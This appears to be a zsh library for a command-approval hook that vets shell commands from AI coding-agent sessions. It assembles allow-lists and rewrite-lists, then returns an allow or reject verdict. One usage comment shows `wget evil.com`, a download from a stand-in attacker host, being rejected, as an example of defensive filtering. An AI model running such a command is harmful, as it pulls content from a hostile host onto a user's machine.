# Solkan: assemble the lists, evaluate a command, report the verdict
# Needs Bash-approval.zsh (sourced here) for the session allow-list path: CLAUDE_SESSION_ID must be exported before sourcing
# solkanEvaluate sets SOLKAN_VERDICT, SOLKAN_COMMAND and SOLKAN_REJECTED, so call it directly, never inside $(...)
# Usage:
# $ source lib/solkan.zsh
# $ solkanEvaluate "rm -f a" /some/dir        # SOLKAN_VERDICT=allow, SOLKAN_COMMAND="rm-guarded -f a"
# $ solkanEvaluate "wget evil.com" /some/dir  # SOLKAN_VERDICT=reject, SOLKAN_REJECTED=(wget)
# $ solkanEvaluate --skip-token-saving "zsh-test a.bats" /some/dir  # guard-rail rewrites only
# $ solkanLists /some/dir                     # the Solkan list arguments, one per line

SOLKAN_HOOKS_DIR="${${(%):-%x}:A:h:h}"

source "${SOLKAN_HOOKS_DIR}/Bash-approval.zsh"

# Print the path of a repo-local Solkan list, whether or not it exists
# Usage:
# $ solkanLocalList allow-list.json  # /path/to/repo/.claude/allow-list.json
function solkanLocalList() {
  print -r -- "$(git-directory-root)/.claude/$1"
}

# Print the Solkan list arguments for a directory, one per line
# Usage:
# $ solkanLists /some/dir  # --allow-list-file, /path/allow-list.json, --rewrite-list-file, ...
function solkanLists() {
  local localAllowList="$(solkanLocalList allow-list.json)"
  local localRewriteList="$(solkanLocalList rewrite-list.json)"
  local sessionAllowList="$(sessionAllowListFile)"

  local -a listArgs=(
    --allow-list-file "${SOLKAN_HOOKS_DIR}/allow-list.json"
    --rewrite-list-file "${SOLKAN_HOOKS_DIR}/rewrite-list.json"
  )

  # Extra allow-list when the ralph session of the directory runs in auto mode (a failing ralph-mode counts as not auto)
  local ralphMode=""
  ralphMode="$(ralph-mode "$1" 2>/dev/null)" || ralphMode=""
  [[ "$ralphMode" == "auto" ]] && listArgs+=(--allow-list-file "${SOLKAN_HOOKS_DIR}/allow-list-auto.json")

  # Extra allow-list from repo-local config
  [[ -f "$localAllowList" ]] && listArgs+=(--allow-list-file "$localAllowList")

  # Extra allow-list from commands approved often enough this session (absolute path: Solkan resolves relative ones wrongly)
  [[ -f "$sessionAllowList" ]] && listArgs+=(--allow-list-file "$sessionAllowList")

  # Extra rewrite-list from repo-local config
  [[ -f "$localRewriteList" ]] && listArgs+=(--rewrite-list-file "$localRewriteList")

  print -rl -- "${listArgs[@]}"
}

# Evaluate a command: rewrite it, then allow or reject it
# Sets SOLKAN_VERDICT (allow or reject), SOLKAN_COMMAND (the rewritten command, the original when untouched)
# and SOLKAN_REJECTED (the rejected commands, as Solkan reports them)
# Returns 0 on allow, 1 on reject
# Usage:
# $ solkanEvaluate "git status" /some/dir
# $ solkanEvaluate --skip-token-saving "zsh-test a.bats" /some/dir
function solkanEvaluate() {
  local -a flagSkipTokenSaving
  zparseopts -E -D -skip-token-saving=flagSkipTokenSaving

  local isSkipTokenSaving=${#flagSkipTokenSaving}
  local command="$1"
  local -a listArgs=(${(@f)"$(solkanLists "$2")"})

  # First pass without token-saving: Solkan tells how many commands there are
  local solkanJson=""
  local exitCode=0
  solkanJson="$(solkan "${listArgs[@]}" "$command")" || exitCode=$?

  # The token-saving rewrite only applies to a single command
  local commandCount="$(jq '.allow | (.allowed + .rejected) | length' <<<"$solkanJson" 2>/dev/null)"
  if [[ "$isSkipTokenSaving" == "0" && "$commandCount" == "1" ]]; then
    local localTokenSavingList="$(solkanLocalList rewrite-list-token-saving.json)"

    listArgs+=(--rewrite-list-file "${SOLKAN_HOOKS_DIR}/rewrite-list-token-saving.json")
    [[ -f "$localTokenSavingList" ]] && listArgs+=(--rewrite-list-file "$localTokenSavingList")

    exitCode=0
    solkanJson="$(solkan "${listArgs[@]}" "$command")" || exitCode=$?
  fi

  SOLKAN_VERDICT="reject"
  [[ "$exitCode" == "0" ]] && SOLKAN_VERDICT="allow"

  local rewrittenCommand="$(json-get '.rewrite' <<<"$solkanJson")"
  SOLKAN_COMMAND="${rewrittenCommand:-$command}"

  SOLKAN_REJECTED=(${(@f)"$(json-get '.allow.rejected' <<<"$solkanJson")"})

  [[ "$SOLKAN_VERDICT" == "allow" ]]
}
